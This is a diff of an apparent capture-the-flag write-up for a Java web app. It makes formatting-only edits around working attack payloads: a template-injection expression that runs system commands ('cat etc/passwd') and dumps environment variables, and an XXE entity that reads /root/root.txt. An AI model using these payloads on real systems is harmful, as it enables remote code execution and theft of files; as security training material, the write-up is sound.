@@ -46,13 +46,12 @@ Investigating a little, we see that this error is of type JAVA, so we are going 
 
 If we do for example:
 ```java
-**{T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+*{T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ```
 reports us 
 ```java
 ## You searched for: Process[pid=1819, exitValue=1]
 ```
-
 But this doesn't give us much information, so let's keep searching.
 
 We can pull up the environment variables:
@@ -63,7 +62,7 @@ We can pull up the environment variables:
 
 and we have as a result
 
-```java
+```shell
 You searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US. UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}
 ```
 
@@ -182,7 +181,7 @@ Finally, the value of "Artist" is parsed in XML format to finally be sent to the
 Therefore, as the data is sent in XML format, we are going to test an attack of type XXE:
 
 We create an XML entity with an XXE attack inside, which will point directly to the root flag:
-```XML
+```shell
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE author [<!ENTITY xxe SYSTEM 'file:///root/root.txt'>]>
 <credits>
